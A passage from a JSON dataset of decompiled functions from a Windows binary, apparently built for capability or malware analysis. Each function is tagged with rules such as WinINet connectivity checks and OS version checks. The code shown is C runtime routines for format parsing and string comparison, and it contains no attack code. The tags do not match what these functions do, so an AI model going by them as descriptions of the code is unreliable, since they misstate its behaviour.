*puVar4;\ncode_r0x0048d0dd:\n    *arg_8h = uVar3;\n    arg_8h[1] = puVar4[1];\n    return arg_8h;\n}\n",
        "token_count": 778
    },
    "004035a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.004035a8(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, \n                      uint param_7, uint param_8)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    int32_t *piVar3;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint noname_2;\n    uint noname_3;\n    uint in_stack_ffffffcc;\n    uint32_t in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    int32_t *noname_7;\n    int32_t *in_stack_ffffffdc;\n    uchar *noname_9;\n    int32_t noname_10;\n    uint *noname_11;\n    \n    noname_9 = &stack0xffffffcc;\n    noname_11 = 0x41e460;\n    noname_10 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    noname_3 = 0;\n    noname_2 = 0x41bd8a;\n    fcn.004060f5(0);\n    piVar2 = *0x56ebd0;\n    noname_7 = *0x56ebd0;\n    if (*0x56f228 == 0) {\n        noname_2 = 0;\n        fcn.004060f5(0);\n        if (*0x56f228 == 0) {\n            *0x56f210 = *0x56f210 + 1;\n            *0x56f228 = *0x56f210;\n        }\n        fcn.00403684();\n    }\n    iVar1 = *(param_1 + 4);\n    if ((*(iVar1 + 0xc) < *0x56f228 || *(iVar1 + 0xc) == *0x56f228) ||\n       (piVar3 = *(*(iVar1 + 8) + *0x56f228 * 4),  piVar3 == NULL)) {\n        if (*(iVar1 + 0x14) != '\\0') {\n            in_stack_ffffffd0 = *0x56f228;\n            iVar1 = fcn.00404ee4();\n            in_stack_ffffffdc = piVar2;\n            if ((in_stack_ffffffd0 <= *(iVar1 + 0xc) && *(iVar1 + 0xc) != in_stack_ffffffd0) &&\n               (piVar3 = *(*(iVar1 + 8) + in_stack_ffffffd0 * 4),  piVar3 != NULL)) goto code_r0x0041be58;\n        }\n        piVar3 = piVar2;\n        if (piVar2 == NULL) {\n            iVar1 = fcn.00402c43(&stack0xffffffd8, param_1, noname_2, noname_3, in_stack_ffffffcc, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_7, in_stack_ffffffdc, noname_9, noname_10, noname_11, 0, \n                                 unaff_ESI, unaff_EDI, unaff_EBX, unaff_EBP, unaff_retaddr, param_1, param_2, param_3, \n                                 param_4, param_5, param_6, param_7, param_8);\n            if (iVar1 == -1) {\n                piVar2 = fcn.004057f9();\n                if (noname_11 != NULL) {\n                    piVar2 = (***noname_11)(1);\n                }\n                return piVar2;\n            }\n            piVar2 = noname_7;\n            fcn.0040238d(noname_7);\n            piVar3 = noname_7;\n            (**(*piVar2 + 4))();\n            *0x56ebd0 = piVar3;\n        }\n    }\ncode_r0x0041be58:\n    fcn.00403684();\n    *in_FS_OFFSET = noname_10;\n    return piVar3;\n}\n",
        "token_count": 948
    },
    "004035e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004035e9(uint arg_8h, uint arg_ch)\n\n{\n    if ((*0x56ec20 == '\\0') || (arg_ch == '\\0')) {\n        fcn.00402c07(arg_8h);\n        fcn.004011c7(arg_8h);\n    }\n    return 1;\n}\n",
        "token_count": 77
    },
    "004035ee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004035ee(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_10h < 0x80000000) {\n        if (arg_10h == 0) {\n            iVar3 = 0;\n        }\n        else {\n            fcn.004057e5(arg_14h);\n            do {\n                uVar1 = *arg_8h;\n                arg_8h = arg_8h + 1;\n                uVar4 = *(uVar1 + *(var_10h + 0x94));\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                iVar3 = uVar4 - *(uVar1 + *(var_10h + 0x94));\n                if ((iVar3 != 0) || (uVar4 == 0)) break;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n            if (var_8h != '\\0') {\n                *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n            }\n        }\n    }\n    else {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    return iVar3;\n}\n",
        "token_count": 518
    },
    "0040361b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040361b(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.004039a4();\n        *puVar6 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049e248:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049e24c:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049e24f:\n            cVar4 = fcn.00402e64(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049e1f4:\n                arg_8h = 0x10;\n                goto code_r0x0049e24f;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049e208;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049e1dc;\n                }\n            }\ncode_r0x0049e258:\n            cVar4 = fcn.004049d5();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404be7();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049e258;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049e208:\n            cVar4 = fcn.00404bdd(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.00402301();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049e258;\n            if (cVar4 == 'i') goto code_r0x0049e248;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.0040236f();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004045de();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049e1f4;\n            }\n            goto code_r0x0049e24c;\n        }\ncode_r0x0049e1dc:\n        cVar4 = fcn.00403f3a();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x0049e2de;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049e2de:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403cd3(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.00405df8(&uStack8, arg_ch, arg_14h, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403cd3(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00401307(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403cd3(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2378
    },
    "00403689": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403689(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049df5e;\n            param_1[7] = 8;\ncode_r0x0049de29:\n            puStack8 = 0x49de2e;\n            puVar6 = fcn.004039a4();\n            *puVar6 = 0x16;\n            puStack8 = 0x49de39;\n            uVar7 = fcn.00403751();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049de29;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049df5e;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049df5e;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049df5e;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049df5e;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049df5e;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049df5e;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049df5e:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049df5e;\n    param_1[7] = 7;\n    puStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x0049fed2:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049fed6:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049fed9:\n            cVar5 = fcn.004042fa(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049fe7e:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049fed9;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0049fe92;\n                if (uVar9 < 0x45) goto code_r0x004a0071;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a0071;\n                    goto code_r0x0049fe66;\n                }\n            }\ncode_r0x0049fee2:\n            cVar5 = fcn.00404002();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00404a07();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x0049fee2;\n            if (uVar9 != 99) goto code_r0x004a0071;\ncode_r0x0049fe92:\n            cVar5 = fcn.004026b7(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.0040143d();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x0049fee2;\n            if (uVar9 == 0x69) goto code_r0x0049fed2;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.00402478();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a0071;\n                cVar5 = fcn.00402608();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a0071;\n                arg_ch_00 = 0;\n                goto code_r0x0049fe7e;\n            }\n            goto code_r0x0049fed6;\n        }\ncode_r0x0049fe66:\n        cVar5 = fcn.00403be3();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.004025e5(),  cVar5 != '\\0')) || (*(param_1 + 0xc) != '\\0'))\n    goto code_r0x004a0071;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x0049ff7c;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049ff7c:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00402937(&stack0xfffffff0, arg_ch, param_1 + 6);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403f2b(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.00405d1c(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a0071:\n    uVar7 = fcn.00403085(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2656
    },
    "004036ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004036ac(uint arg_8h, uint noname_1, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        fcn.004065fa(arg_8h);\n        return;\n    }\n    fcn.004051dc(arg_8h);\n    return;\n}\n",
        "token_count": 76
    },
    "004036e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004036e3(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*0x57004c != 0) {\n        iVar2 = fcn.0040533f(arg_8h, arg_ch, 0);\n        return iVar2;\n    }\n    if ((arg_8h != NULL) && (arg_ch != NULL)) {\n        do {\n            uVar3 = *arg_8h;\n            if (uVar3 - 0x41 < 0x1a) {\n                uVar3 = uVar3 + 0x20;\n            }\n            uVar4 = *arg_ch;\n            arg_8h = arg_8h + 1;\n            if (uVar4 - 0x41 < 0x1a) {\n                uVar4 = uVar4 + 0x20;\n            }\n            arg_ch = arg_ch + 1;\n        } while ((uVar3 - uVar4 == 0) && (uVar3 != 0));\n        return uVar3 - uVar4;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0x7fffffff;\n}\n",
        "token_count": 315
    },
    "0040378d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040378d(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x570488)) {\n        iVar3 = (arg_8h & 0x3f) * 0x38;\n        if (*(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x570220)) == -1) {\n            iVar1 = fcn.0040199c();\n            if (iVar1 == 1) {\n                if (arg_8h == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (arg_8h == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (arg_8h != 2) goto code_r0x004c9f20;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, arg_ch);\n            }\ncode_r0x004c9f20:\n            *(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x570220)) = arg_ch;\n            return 0;\n        }\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 9;\n    puVar2 = fcn.0040185c();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 377
    },
    "004037dd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t *\nfcn.004037dd(uint param_1, uint32_t *param_2, uint32_t param_3, int32_t *param_4, int32_t param_5, uint8_t param_6, \n            char *param_7, int32_t *param_8)\n\n{\n    char cVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    uint arg_ch;\n    uint8_t **ppuVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    int32_t *in_FS_OFFSET;\n    bool bVar14;\n    uint32_t uVar15;\n    int32_t *piStack120;\n    int32_t *piStack116;\n    uint32_t uStack100;\n    uint32_t uStack92;\n    uint16_t uStack86;\n    int32_t *piStack84;\n    int32_t *piStack80;\n    int32_t *piStack68;\n    int32_t *piStack64;\n    int32_t *piStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff88;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e4d0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (param_8 == NULL) {\n        bVar14 = false;\n    }\n    else {\n        bVar14 = (*param_7 - 0x2bU & 0xfd) == 0;\n    }\n    arg_ch = 0x541e8a;\n    if ((~*(param_5 + 0x14) & 0x3000) == 0) {\n        piStack48 = bVar14 + 2;\n        arg_ch = 0x541e8d;\n        if (((param_8 < piStack48) || (param_7[bVar14] != '0')) || ((param_7[bVar14 + 1] | 0x20U) != 0x78))\n        goto code_r0x0041cdf0;\n    }\n    else {\ncode_r0x0041cdf0:\n        piStack48 = bVar14;\n    }\n    piStack36 = fcn.004026f8(param_7, arg_ch);\n    uStack86 = 0x2e;\n    ppuVar5 = fcn.00401366();\n    uStack86 = uStack86 & 0xff00 | **ppuVar5;\n    uStack40 = fcn.004026f8(param_7, &stack0xffffffaa);\n    piStack80 = *(*(param_5 + 0x30) + 4);\n    (**(*piStack80 + 4))();\n    uStack20 = 0;\n    piStack44 = &stack0xffffffac;\n    uVar15 = 0x41ce46;\n    piVar6 = fcn.004035a8(piStack44);\n    if ((piStack80 != NULL) && (puVar7 = (**(*piStack80 + 8))(),  puVar7 != NULL)) {\n        uVar15 = 0x41ce66;\n        (***puVar7)(1);\n    }\n    piStack68 = NULL;\n    piStack64 = 0xf;\n    piStack84 = NULL;\n    if (param_8 < 0x10) {\n        piStack68 = param_8;\n        fcn.0040314d(&stack0xffffffac, 0, param_8);\n        (&stack0xffffffac)[param_8] = 0;\n    }\n    else {\n        uStack20 = 0xffffffff;\n        fcn.0040359e(param_8, uVar15 & 0xffffff00 | piStack120 & 0xff, 0);\n    }\n    if (0xf < piStack64) {\n        piStack44 = piStack84;\n    }\n    uStack20 = 3;\n    (**(*piVar6 + 0x1c))(param_7, param_7 + param_8, piStack44);\n    piStack116 = *(*(param_5 + 0x30) + 4);\n    (**(*piStack116 + 4))();\n    uStack20 = 4;\n    piVar6 = fcn.0040632a(&stack0xffffff88);\n    if ((piStack116 != NULL) && (puVar7 = (**(*piStack116 + 8))(),  puVar7 != NULL)) {\n        (***puVar7)(1);\n    }\n    uStack20 = 3;\n    piStack44 = piVar6;\n    (**(*piVar6 + 0x14))(&stack0xffffff88);\n    uStack20 = 5;\n    uVar3 = (**(*piStack44 + 0x10))();\n    piStack60 = piStack60 & 0xffffff00 | uVar3;\n    piVar6 = piStack36;\n    if (uStack40 != param_8) {\n        uVar4 = (**(*piStack44 + 0xc))();\n        piVar6 = piStack84;\n        if (piStack64 < 0x10) {\n            piVar6 = &stack0xffffffac;\n        }\n        *(piVar6 + uStack40) = uVar4;\n        piVar6 = uStack40;\n    }\n    piVar13 = &stack0xffffff88;\n    if (0xf < uStack100) {\n        piVar13 = piStack120;\n    }\n    uStack40 = piStack60;\n    while ((cVar1 = *piVar13,  cVar1 - 1U < 0x7e && (cVar1 < piVar6 - piStack48))) {\n        piVar6 = piVar6 - cVar1;\n        if (piStack68 < piVar6) {\n            uStack20 = 5;\n            fcn.004064ab();\n            goto code_r0x0041d5ab;\n        }\n        if (piStack64 == piStack68) {\n            uStack20 = 5;\n            piStack44 = piVar13;\n            piStack36 = piVar6;\n            fcn.004012c1();\n            cVar1 = *(piStack44 + 1);\n            piVar6 = piStack36;\n            piVar13 = piStack44;\n        }\n        else {\n            piVar12 = &stack0xffffffac;\n            if (0xf < piStack64) {\n                piVar12 = piStack84;\n            }\n            puVar8 = piStack68 + (1 - piVar6);\n            piStack68 = piStack68 + 1;\n            fcn.004058f3(piVar12 + piVar6 + 1, piVar12 + piVar6, puVar8);\n            *(piVar12 + piVar6) = piStack60;\n            cVar1 = *(piVar13 + 1);\n        }\n        if ('\\0' < cVar1) {\n            piVar13 = piVar13 + 1;\n        }\n    }\n    piVar6 = *(param_5 + 0x20);\n    piStack60 = piStack68;\n    piVar13 = piVar6 - piStack68;\n    if (piVar6 < piStack68) {\n        piVar13 = NULL;\n    }\n    if ((SBORROW4(*(param_5 + 0x24), piVar6 == NULL) != false) != *(param_5 + 0x24) - 